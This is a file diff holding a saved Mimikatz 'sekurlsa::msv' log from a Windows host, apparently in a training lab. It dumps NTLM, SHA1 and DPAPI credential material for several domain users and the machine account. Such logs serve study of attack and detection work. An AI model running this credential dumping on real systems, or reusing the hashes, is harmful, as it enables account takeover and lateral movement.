@@ -1,0 +1,419 @@
+Using 'hashes.txt' for logfile : OK
+
+mimikatz # sekurlsa::msv
+
+Authentication Id : 0 ; 2375092 (00000000:00243db4)
+Session           : RemoteInteractive from 8
+User Name         : t2_abigail.cox
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 12:25:05 PM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4766
+	msv :	
+	 [00000003] Primary
+	 * Username : t2_abigail.cox
+	 * Domain   : ZA
+	 * NTLM     : 12b70f47f9549e539a58e1117cefa99a
+	 * SHA1     : 606393a78e29ee9a35a4b1810766dd7df9cb3205
+	 * DPAPI    : 027a3e99a3e6af7d48f0c3f13889a66f
+
+Authentication Id : 0 ; 2368964 (00000000:002425c4)
+Session           : Interactive from 8
+User Name         : DWM-8
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 12:25:04 PM
+SID               : S-1-5-90-0-8
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 1051741 (00000000:00100c5d)
+Session           : RemoteInteractive from 6
+User Name         : t1_toby.beck2
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 11:45:10 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4617
+	msv :	
+	 [00000003] Primary
+	 * Username : t1_toby.beck2
+	 * Domain   : ZA
+	 * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+	 * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+	 * DPAPI    : 4350e787e87478881a14c357350ffb6e
+
+Authentication Id : 0 ; 1043349 (00000000:000feb95)
+Session           : Interactive from 6
+User Name         : DWM-6
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:45:10 AM
+SID               : S-1-5-90-0-6
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 846672 (00000000:000ceb50)
+Session           : RemoteInteractive from 5
+User Name         : t1_toby.beck1
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 11:44:59 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4616
+	msv :	
+	 [00000003] Primary
+	 * Username : t1_toby.beck1
+	 * Domain   : ZA
+	 * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+	 * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+	 * DPAPI    : 489fed8eeb5acc4ffb205663491b62d3
+
+Authentication Id : 0 ; 836619 (00000000:000cc40b)
+Session           : Interactive from 5
+User Name         : DWM-5
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:44:59 AM
+SID               : S-1-5-90-0-5
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 716552 (00000000:000aef08)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:44:48 AM
+SID               : S-1-5-90-0-4
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 396363 (00000000:00060c4b)
+Session           : RemoteInteractive from 3
+User Name         : t1_toby.beck5
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 11:35:57 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4620
+	msv :	
+	 [00000003] Primary
+	 * Username : t1_toby.beck5
+	 * Domain   : ZA
+	 * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+	 * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+	 * DPAPI    : 0537b9105954f5d1d1bc2f1763d86fd6
+
+Authentication Id : 0 ; 303872 (00000000:0004a300)
+Session           : RemoteInteractive from 2
+User Name         : t1_toby.beck4
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 11:35:46 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4619
+	msv :	
+	 [00000003] Primary
+	 * Username : t1_toby.beck4
+	 * Domain   : ZA
+	 * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+	 * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+	 * DPAPI    : 47d511de8e208dc0053e88223dcdd31c
+
+Authentication Id : 0 ; 93220 (00000000:00016c24)
+Session           : Service from 0
+User Name         : MSSQL$MICROSOFT##WID
+Domain            : NT SERVICE
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:14 AM
+SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 42408 (00000000:0000a5a8)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:12 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : THMJMP2$
+Domain            : ZA
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:12 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 2381705 (00000000:00245789)
+Session           : RemoteInteractive from 8
+User Name         : t2_abigail.cox
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 12:25:05 PM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4766
+	msv :	
+	 [00000003] Primary
+	 * Username : t2_abigail.cox
+	 * Domain   : ZA
+	 * NTLM     : 12b70f47f9549e539a58e1117cefa99a
+	 * SHA1     : 606393a78e29ee9a35a4b1810766dd7df9cb3205
+	 * DPAPI    : 027a3e99a3e6af7d48f0c3f13889a66f
+
+Authentication Id : 0 ; 2368939 (00000000:002425ab)
+Session           : Interactive from 8
+User Name         : DWM-8
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 12:25:04 PM
+SID               : S-1-5-90-0-8
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 1184774 (00000000:00121406)
+Session           : RemoteInteractive from 7
+User Name         : t1_toby.beck3
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 11:45:21 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4618
+	msv :	
+	 [00000003] Primary
+	 * Username : t1_toby.beck3
+	 * Domain   : ZA
+	 * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+	 * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+	 * DPAPI    : 20fa99221aff152851ce37bcd510e61e
+
+Authentication Id : 0 ; 1178912 (00000000:0011fd20)
+Session           : Interactive from 7
+User Name         : DWM-7
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:45:21 AM
+SID               : S-1-5-90-0-7
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 1178888 (00000000:0011fd08)
+Session           : Interactive from 7
+User Name         : DWM-7
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:45:21 AM
+SID               : S-1-5-90-0-7
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 1043599 (00000000:000fec8f)
+Session           : Interactive from 6
+User Name         : DWM-6
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:45:10 AM
+SID               : S-1-5-90-0-6
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 836927 (00000000:000cc53f)
+Session           : Interactive from 5
+User Name         : DWM-5
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:44:59 AM
+SID               : S-1-5-90-0-5
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 722402 (00000000:000b05e2)
+Session           : RemoteInteractive from 4
+User Name         : t1_toby.beck
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 5/9/2023 11:44:48 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4607
+	msv :	
+	 [00000003] Primary
+	 * Username : t1_toby.beck
+	 * Domain   : ZA
+	 * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+	 * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+	 * DPAPI    : d9cd92937c7401805389fbb51260c45f
+
+Authentication Id : 0 ; 716577 (00000000:000aef21)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:44:48 AM
+SID               : S-1-5-90-0-4
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 390590 (00000000:0005f5be)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:35:57 AM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 390564 (00000000:0005f5a4)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:35:57 AM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 287300 (00000000:00046244)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:35:46 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 287276 (00000000:0004622c)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:35:46 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:14 AM
+SID               : S-1-5-17
+	msv :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:12 AM
+SID               : S-1-5-19
+	msv :	
+
+Authentication Id : 0 ; 42437 (00000000:0000a5c5)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:12 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 22052 (00000000:00005624)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:12 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : THMJMP2$
+	 * Domain   : ZA
+	 * NTLM     : d761821d0c506db00058160ca3185b51
+	 * SHA1     : 34e20ff1610da0aa239062a503b298a7d0173c8d
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : THMJMP2$
+Domain            : ZA
+Logon Server      : (null)
+Logon Time        : 5/9/2023 11:34:12 AM
+SID               : S-1-5-18
+	msv :	
+
+mimikatz # exit
+Bye!
